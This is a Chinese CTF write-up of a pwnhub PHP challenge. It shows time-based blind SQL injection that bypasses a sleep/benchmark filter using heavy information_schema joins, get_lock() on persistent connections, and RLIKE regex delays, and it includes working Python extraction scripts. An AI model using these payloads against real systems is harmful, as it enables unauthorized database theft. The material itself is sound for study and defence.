> 原文链接: https://www.anquanke.com//post/id/104319 


# pwnhub time injection带来的新思路


                                阅读量   
                                **126569**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01b71957963a2e6732.jpg)](https://p5.ssl.qhimg.com/t01b71957963a2e6732.jpg)

## 前言

前几天pwnhub的一道新题`全宇宙最最简单的PHP博客系统`,带来了不少time injection的新思路，今天写这篇文章研究一下



## 题目分析

题目直接给出了源码<br>
核心代码非常少，我就把漏洞文件的代码全部给出了<br>
article.php

```
&lt;?php
require 'conn.php';
$id = $_GET['id'];
if(preg_match("/(sleep|benchmark|outfile|dumpfile|load_file|join)/i", $_GET['id']))
`{`
    die("you bad bad!");
`}`
$sql = "select * from article where id='".intval($id)."'";
$res = mysql_query($sql);
if(!$res)`{`
    die("404 not found!");
`}`
$row = mysql_fetch_array($res, MYSQL_ASSOC);
mysql_query("update view set view_times=view_times+1 where id = '".$id." '");
?&gt;
```

注意到题目功能非常少：

```
conn.php  连接文件
index.php  主页
article.php  文章页面
```

而核心代码只有article.php十几行<br>
所提供的线索即

```
1.查询文章
2.记录查看次数
```

我们逐句分析，发现在查询的时候

```
$sql = "select * from article where id='".intval($id)."'";
```

我们传入的参数会被强转int，这里显然就不存在注入了<br>
然后是更新查看次数的地方，处理非常简单

```
if(preg_match("/(sleep|benchmark|outfile|dumpfile|load_file|join)/i", $_GET['id']))
`{`
    die("you bad bad!");
`}`
```

可以看到一些危险函数

```
outfile dumpfile load_file
```

都已经被过滤了<br>
然后有关时间的函数

```
sleep benchmark
```

数都被过滤<br>
但是不难发现

```
select or and ()
```

等常用字符都还存在，那么能不能进行注入呢？<br>
首先我们可以确定<br>
此题应该用的是时间注入<br>
但是时间相关函数都被过滤了，我们如何进行时间盲注呢？<br>
这里有3种发散思维的解法，我在这里都总结了一下，以便日后的使用



## Heavy Query

个人认为这个方法是本题的最优解<br>
原理就如方法的名字：大负荷查询<br>
即用到一些消耗资源的方式让数据库的查询时间尽量变长<br>
而消耗数据库资源的最有效的方式就是让两个大表做笛卡尔积，这样就可以让数据库的查询慢下来<br>
而最后找到系统表information_schema数据量比较大，可以满足要求，所以我们让他们做笛卡尔积。<br>
我们看一下数量

```
mysql&gt; select count(*) from information_schema.tables;
+----------+
| count(*) |
+----------+
|      298 |
+----------+
```

不难看到系统表里共有298行数据<br>
同样的

```
mysql&gt; select count(*) from information_schema.COLUMNS;
+----------+
| count(*) |
+----------+
|     3131 |
+----------+
1 row in set (0.08 sec)

```

不难看出系统库数据之多<br>
倘若我们对如此大量的数据进行2次甚至3次以上的笛卡尔积运算，运算量是非常可观的<br>
不妨进行一些本地测试，当然这里的延时时间和本地数据库内容的量有关<br>
尝试1：使用3列

```
select * from content where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C);
```

结果

```
+----+-------------------------------------+
| id | content                             |
+----+-------------------------------------+
|  1 | I think you may need sql injection! |
+----+-------------------------------------+
1 row in set (21 min 23.49 sec)
```

延时高达21min<br>
尝试2：使用2列+1表

```
select * from content where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.Tables C);
```

结果

```
+----+-------------------------------------+
| id | content                             |
+----+-------------------------------------+
|  1 | I think you may need sql injection! |
+----+-------------------------------------+
1 row in set (2 min 4.42 sec)
```

延时大约在2分钟左右<br>
尝试3：使用2列+1库

```
select * from content where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);
```

结果

```
+----+-------------------------------------+
| id | content                             |
+----+-------------------------------------+
|  1 | I think you may need sql injection! |
+----+-------------------------------------+
1 row in set (4.47 sec)
```

延时大约在5s左右<br>
所以大家可以看见，想要多大的负荷都可以自己调整，如果连3列都嫌少，还可以

```
select * from content where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C,information_schema.columns D,information_schema.columns E .....);
```

想要多少有多少，可以说机动性很强了<br>
应用起来也很容易，一般情况下，我们的盲注是这样测试的

```
id = 1' and 1 and sleep(5)%23
id = 1' and 0 and sleep(5)%23
```

前者会sleep 5秒，而后者瞬间响应<br>
用heavy query也是同理

```
id = 1' and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C)%23
id = 1' and 0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C)%23
```

以我本地为例

```
mysql&gt; select * from content where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);
+----+-------------------------------------+
| id | content                             |
+----+-------------------------------------+
|  1 | I think you may need sql injection! |
+----+-------------------------------------+
1 row in set (4.91 sec)

mysql&gt; select * from content where id = 1 and 0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);
Empty set (0.00 sec)

```

结果显而易见，为此我们就可以轻松写出盲注脚本

```
import requests

url = "http://52.80.179.198:8080/article.php?id=1' and %s and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)%%23"
data = ""
for i in range(1,1000):
    for j in range(33,127):
        #payload = "(ascii(substr((database()),%s,1))=%s)"%(i,j) #post
        #payload = "(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)" % (i, j) #article,flags
        #payload = "(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)" % (i, j) #flag
        payload = "(ascii(substr((select flag from flags limit 1),%s,1))=%s)" % (i, j)
        payload_url = url%(payload)
        try:
            r = requests.get(url=payload_url,timeout=8)
        except:
            data +=chr(j)
            print data
            break
```

即可探测到数据库为

```
post
```

表为

```
article,flags
```

字段为

```
flag
```

Flag为

```
pwnhub`{`flag:a6fe3d9432024e97aa40bd867161561e`}`
```



## Get_lock()

这也是长亭科技大佬提出来的新的时间盲注方案，应该也是本题的预期解<br>
先来了解一下mysql的get_lock()是什么<br>
get_lock()是Mysql的锁机制<br>
(1)get_lock会按照key来加锁，别的客户端再以同样的key加锁时就加不了了，处于等待状态。<br>
(2)当调用release_lock来释放上面加的锁或客户端断线了，上面的锁才会释放，其它的客户端才能进来。<br>
我们同时打开2个cmd，分别记做cmd1和cmd2，并登入mysql<br>
我们在cmd1执行

```
mysql&gt; select get_lock('skysec.top',1);
+--------------------------+
| get_lock('skysec.top',1) |
+--------------------------+
|                        1 |
+--------------------------+
1 row in set (0.00 sec)

```

对key为`skysec.top`的资源加锁<br>
此时我们再在cmd2执行

```
mysql&gt; select get_lock('skysec.top',5);
+--------------------------+
| get_lock('skysec.top',5) |
+--------------------------+
|                        0 |
+--------------------------+
1 row in set (5.00 sec)

```

发现sleep了5s<br>
我们换个数字试试

```
mysql&gt; select get_lock('skysec.top',2);
+--------------------------+
| get_lock('skysec.top',2) |
+--------------------------+
|                        0 |
+--------------------------+
1 row in set (2.00 sec)

```

没错，2s正是我们想要的time injection的时间长度<br>
然后我们关闭cmd1后再在cmd2执行

```
mysql&gt; select get_lock('skysec.top',5);
+--------------------------+
| get_lock('skysec.top',5) |
+--------------------------+
|                        1 |
+--------------------------+
1 row in set (0.00 sec)

```

发现cmd1断开后，锁就自动释放了<br>
既然这么好用，我为什么不说他是最佳方案呢？<br>
因为这种方法需要有前提，即长连接<br>
一般在php5版本系列中，我们建立与Mysql的连接使用的是

```
mysql_connect()
```

而在本题中我们不难发现，conn.php中使用的方法是

```
$con = mysql_pconnect("mysql",$_ENV['MYSQL_USER'],$_ENV['MYSQL_PASSWORD']);
```

这两者有什么不同呢？

```
mysql_connect() 脚本一结束，到服务器的连接就被关闭
mysql_pconnect() 打开一个到 MySQL 服务器的持久连接
```

官方手册是这样描述二者的主要区别的:<br>
mysql_pconnect() 和 mysql_connect() 非常相似，但有两个主要区别。<br>
首先，当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的（持久）连接，如果找到，则返回此连接标识而不打开新连接。<br>
其次，当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用（mysql_close() 不会关闭由 mysql_pconnect() 建立的连接）。<br>
简单来说，即

```
mysql_connect()
```

使用后立刻就会断开<br>
而

```
mysql_pconnect()
```

会保持连接，并不会立刻断开<br>
但这和get_lock()的时间盲注有什么关系呢？<br>
原因很简单<br>
我们的时间盲注必须基于我们请求加锁的资源已经被其他客户端加锁过了<br>
而mysql_connect()一结束，就会立刻关闭连接<br>
这就意味着，我们刚刚对资源`skysec.top`加完锁就立刻断开了<br>
而get_lock一旦断开连接，就会立刻释放资源<br>
那么也就破坏了我们的前提：我们请求加锁的key已经被其他客户端加锁过了<br>
所以如果使用了`mysql_connect()`，那么get_lock的方法将不适用<br>
而`mysql_pconnect()`建立的却是长连接，我们的锁可以在一段有效的时间中一直加持在特定资源上<br>
从而使我们可以满足大前提，而导致新的time injection手法<br>
当然这里还有一个注意点<br>
即第一次加锁后，需要等待1~2分钟，再访问的时候服务器就会判断你为客户B，而非之前加锁的客户A<br>
此时即可触发get_lock<br>
同样我们也本地测试一下，还是之前的cmd1和cmd2<br>
cmd1执行

```
mysql&gt; select * from content where id = 1 and get_lock('skysec.top',1);
+----+-------------------------------------+
| id | content                             |
+----+-------------------------------------+
|  1 | I think you may need sql injection! |
+----+-------------------------------------+
1 row in set (0.00 sec)

```

对资源`skysec.top`加锁成功<br>
然后cmd2执行

```
mysql&gt; select * from content where id =1 and 1 and get_lock('skysec.top',5);
Empty set (5.00 sec)

mysql&gt; select * from content where id =1 and 0 and get_lock('skysec.top',5);
Empty set (0.00 sec)

```

从而达到时间盲注的作用<br>
脚本如下

```
# -*- coding: utf-8 -*-
import requests
import time
url1 = "http://52.80.179.198:8080/article.php?id=1' and get_lock('skysec.top',1)%23"
r = requests.get(url=url1)
time.sleep(90)
# 加锁后变换身份
url2 = "http://52.80.179.198:8080/article.php?id=1' and %s and get_lock('skysec.top',5)%%23"
data = ""
for i in range(1,1000):
    print i
    for j in range(33,127):
        #payload = "(ascii(substr((database()),%s,1))=%s)"%(i,j) #post
        payload = "(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)" % (i, j) #article,flags
        #payload = "(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)" % (i, j) #flag
        #payload = "(ascii(substr((select flag from flags limit 1),%s,1))=%s)" % (i, j)
        payload_url = url2%(payload)
        try:
            s = requests.get(url=payload_url,timeout=4.5)
        except:
            data +=chr(j)
            print data
            break
```

最后再总结一下基于get_lock()的新型时间注入<br>
首先必须满足前提：<br>
使用长连接，即

```
mysql_pconnect()
```

然后构造被加锁的数据<br>
1.以客户A的身份,对资源skysec.top进行加锁<br>
2.等待90s，让服务器将我们下一次的查询当做客户B<br>
3.利用客户B去尝试对资源skysec.top进行加锁，由于资源已被加锁，导致延时



## Rlike

这是C014大佬用的方法，我也是真的服<br>
即利用SQL中多次因正则消耗计算资源，达到延时的目的<br>
即构造一个超长的字符串，进行正则匹配

```
concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'
```

我测试了一下

```
mysql&gt; select * from content where id =1 and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';
Empty set (4.24 sec)

mysql&gt; select * from content where id =1 and IF(0,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';
Empty set (0.00 sec)
```

的确可以达到时间延迟的目的<br>
但是效果好像不是很好，也不推荐这个方法(不过思路可以，或许某些特定情况适用)<br>
附上C014大佬的题解：

```
https://www.cdxy.me/?p=789
```

感兴趣的可以研究一下



## 后记

做惯了sleep的盲注，本以为heavy query已经够可以的了，没想到还有get_lock和正则计算这样新鲜的解法，果然好题利于发散思维~给pwnhub打call~<br>
最后归纳出一些时间盲注的方法<br>
1.sleep()<br>
2.benchmark()<br>
3.heavy query<br>
4.get_lock()<br>
5.rlike
